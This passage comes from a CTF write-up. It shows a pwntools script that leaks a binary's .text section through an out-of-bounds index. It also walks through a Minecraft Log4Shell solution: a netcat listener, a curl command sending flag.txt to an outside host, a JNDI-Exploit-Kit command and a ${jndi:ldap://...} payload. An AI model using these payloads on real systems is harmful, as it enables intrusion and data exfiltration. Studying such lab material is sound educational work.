ascii character:
- 0x74 -> 116 -> t
- 0x68 -> 104 -> h
- 0x73 -> 115 -> s
- 0x20 -> 32 -> space

As we can see with each run of the program we can dump 4 bytes from the `.text` segment of the program. Using this technique we can search for the flag and dump it.

While this could be achieved manually, the following shows a python program which performs this task automatically. Running the program results in:
```
????????????????????????????????????????????????????????nflag{c4lcul4t1ng-th3-0ffs3ts-l1k3-a-pro}.Maths 1.Maths 2.Object Oriented Programming.Computer Vision.IT-Security.Forens????Software Engineering.Theoretical Computer Science.Courses [%????.  - [%p] %s..Pick one: .%ld.You picked ????...;????????
```
This is a dump of most of the strings from the `.text` section. As we can see it includes the flag `nflag{c4lcul4t1ng-th3-0ffs3ts-l1k3-a-pro}`

**Python script:**
```
from pwn import *
from binascii import unhexlify
result = ""
for offset in range(-100, 200, 4):
    try:
        p = remote("localhost", 4000) # replace with your target
        p.readuntil("Courses [0x")
        courses = int(p.read(8), 16)
        p.readuntil("  - [0x")
        math1 = int(p.read(8), 16)
        p.readuntil("Pick one:")
        x = int((math1 - courses + offset) / 4)
        p.sendline(str(x).encode("utf8"))
        p.readuntil("You picked 0x")
        data = unhexlify(p.read(8))
        p.close()
        for c in data[::-1]:
            c = chr(c)
            if c.isprintable():
                result += c
            else:
                result += "."
    except:
        print("Error reading offset {}, filling with ?".format(offset))
        result += "????"
    if offset % 10 == 0:
        print("reading offset {}/120".format(offset))
print(result)
```

</br>

## Minecraft - Medium

*My buddy set up a Minecraft server. I wonder what else is on their machine?*
</br>

The task is a Minecraft server running a vanilla Minecraft 1.16.5 server on OpenJDK 8u111. It is vulnerable for the [Log4Shell (https://en.wikipedia.org/wiki/Log4Shell) vulnerability. It can be exploited using a publicly available exploit toolkit such as [JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit). The flag is hidden in a file named "flag.txt".

To start with, we need a publicly available server which we use to exfiltrate our data from the target network. This can be achieved by running `netcat` on a server of your choice:

```
nc -l 8001
```

We craft a command to upload the flag from the Minecraft server to the server that is running `netcat`. You can use any command here including a reverse shell, but for simplicity we just upload the flag file using `curl`:

```
curl --data-binary @flag.txt http://myserver:8001
```

To generate and serve the payload, we can use `JNDI-Exploit-Kit` and pass our crafted command as an argument:

```
java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -C "curl --data-binary @flag.txt http://myserver:8001/"
```

The tool will present a variety of different payloads. We take the `JDK 1.8 ldap://` payload and wrap it in a Log4j substitution:

```
${jndi:ldap://myserver:1389/w9nmaj}
```

Finally we just connect to the Minecraft server and drop the payload string in the chat. 

![](../../src/blog/images/neuland-ctf-04-2022/minecraft.webp)
</br>

The server will log all chat messages to the server log and as a result trigger the Log4Shell vulnerability.

```
$ nc -l 8001
POST / HTTP/1.1
User-Agent: curl/7.38.0
Host: myserver:8001
Accept: */*
Content-Length: 26
Content-Type: application/x-www-form-urlencoded

nland{d166y-d166y-3xpl017}
```
